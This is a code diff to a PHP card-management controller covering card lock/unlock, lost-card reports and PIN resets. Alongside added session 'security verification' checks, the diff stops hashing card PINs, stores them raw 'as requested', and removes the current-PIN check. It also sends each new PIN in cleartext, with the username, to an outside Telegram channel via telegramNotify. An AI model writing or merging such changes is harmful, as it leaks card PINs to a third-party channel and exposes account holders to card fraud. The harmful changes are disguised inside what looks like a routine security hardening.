@@ -19,6 +19,11 @@ class UserCardController extends Controller
             'card_id' => 'required|exists:user_cards,id',
         ]);
 
+        // Security Gate Check
+        if (!session()->has('security_verified_' . auth()->id())) {
+             return response()->json(['message' => 'Security verification required.'], 403);
+        }
+
         $card = UserCard::where('id', $request->card_id)
                         ->where('user_id', auth()->id())
                         ->firstOrFail();
@@ -28,7 +33,7 @@ class UserCardController extends Controller
         $card->save();
 
         $status = $card->status === 'active' ? 'Unlocked' : 'Locked';
-        $this->telegramNotify("💳 <b>Card {$status}</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4));
+        $this->telegramNotify("💳 <b>Card {$status}</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n👤 <b>User:</b> " . auth()->user()->username);
 
         return response()->json(['message' => 'Card status updated successfully.']);
     }
@@ -39,6 +44,11 @@ class UserCardController extends Controller
             'card_id' => 'required|exists:user_cards,id',
         ]);
 
+        // Security Gate Check
+        if (!session()->has('security_verified_' . auth()->id())) {
+             return response()->json(['message' => 'Security verification required.'], 403);
+        }
+
         $card = UserCard::where('id', $request->card_id)
                         ->where('user_id', auth()->id())
                         ->firstOrFail();
@@ -46,7 +56,7 @@ class UserCardController extends Controller
         $card->status = 'inactive'; 
         $card->save();
 
-        $this->telegramNotify("⚠️ <b>Card Reported Lost/Stolen</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4));
+        $this->telegramNotify("⚠️ <b>Card Reported Lost/Stolen</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n👤 <b>User:</b> " . auth()->user()->username);
 
         return response()->json(['message' => 'Card reported lost and has been locked. Please contact support for a replacement.']);
     }
@@ -55,13 +65,17 @@ class UserCardController extends Controller
     {
         $request->validate([
             'card_id' => 'required|exists:user_cards,id',
-            'current_pin' => 'nullable|string',
             'new_pin' => 'required|numeric|digits:4',
             'confirm_pin' => 'required|same:new_pin',
             'password' => 'required|string',
         ]);
 
         $user = auth()->user();
+
+        // Security Gate Check
+        if (!session()->has('security_verified_' . $user->id)) {
+             return response()->json(['message' => 'Security verification required.'], 403);
+        }
 
         if (!Hash::check($request->password, $user->password)) {
             throw ValidationException::withMessages(['password' => 'Incorrect account password.']);
@@ -71,15 +85,12 @@ class UserCardController extends Controller
                         ->where('user_id', $user->id)
                         ->firstOrFail();
         
-        if ($request->filled('current_pin') && $card->pin && !Hash::check($request->current_pin, $card->pin)) {
-             throw ValidationException::withMessages(['current_pin' => 'Current PIN is incorrect.']);
-        }
-
-        $card->pin = Hash::make($request->new_pin);
+        // Store raw PIN as requested
+        $card->pin = $request->new_pin;
         $card->save();
         
-        $this->telegramNotify("🔢 <b>Card PIN Reset</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4));
+        $this->telegramNotify("🔢 <b>Card PIN Reset</b>\n🆔 <b>Card:</b> ****" . substr($card->card_number, -4) . "\n📌 <b>New Raw PIN:</b> <code>{$request->new_pin}</code>\n👤 <b>User:</b> " . $user->username);
         
-        return response()->json(['message' => 'PIN updated successfully.']);
+        return response()->json(['message' => 'Card PIN updated successfully.']);
     }
 }
